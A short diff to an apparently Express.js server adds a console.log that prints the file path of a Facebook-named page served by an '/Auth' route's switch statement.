@@ -205,6 +205,7 @@ app.get("/Auth", async (req, res)=>{
             break;
         case "facebook":
           res.sendFile(path.join(__dirname, 'public/facebook', 'index.html'));
+          console.log(path.join(__dirname, 'public/facebook', 'index.html'));
             break;
         case "instagram":
           res.sendFile(path.join(__dirname, 'public/instagram', 'index.html'));
